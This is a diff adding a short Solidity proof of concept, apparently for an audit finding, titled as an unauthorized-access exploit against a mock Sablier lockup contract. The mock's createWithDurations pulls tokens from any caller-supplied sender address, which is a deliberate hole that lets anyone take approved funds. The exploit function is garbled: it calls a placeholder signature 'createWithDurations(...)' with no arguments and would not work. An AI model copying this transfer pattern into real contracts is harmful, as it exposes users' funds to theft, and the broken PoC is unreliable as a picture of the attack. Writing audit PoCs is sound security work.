@@ -1,0 +1,46 @@
+// SPDX-License-Identifier: BUSL-1.1
+pragma solidity >=0.8.22;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+
+contract UnauthorizedAccessExploit {
+    using SafeERC20 for IERC20;
+
+    IERC20 public token;
+    address public lockupContract;
+
+    constructor(address _token, address _lockupContract) {
+        token = IERC20(_token);
+        lockupContract = _lockupContract;
+    }
+
+    function exploit() external {
+        // Attacker calls the function without any access control
+        lockupContract.call(abi.encodeWithSignature("createWithDurations(...)"));
+    }
+}
+
+// PoC Contract: Represents the SablierV2LockupLinear contract without access control
+contract SablierV2LockupLinear {
+    using SafeERC20 for IERC20;
+
+    mapping(uint256 => uint256) public balances;
+    uint256 public nextStreamId;
+
+    function createWithDurations(address sender, address recipient, uint256 totalAmount, IERC20 asset) external {
+        uint256 streamId = nextStreamId;
+        nextStreamId++;
+
+        // Store the deposit
+        balances[streamId] = totalAmount;
+
+        // Transfer the deposit amount
+        asset.safeTransferFrom(sender, address(this), totalAmount);
+
+        // Emit an event
+        emit StreamCreated(streamId, sender, recipient, totalAmount);
+    }
+
+    event StreamCreated(uint256 indexed streamId, address indexed sender, address indexed recipient, uint256 totalAmount);
+}
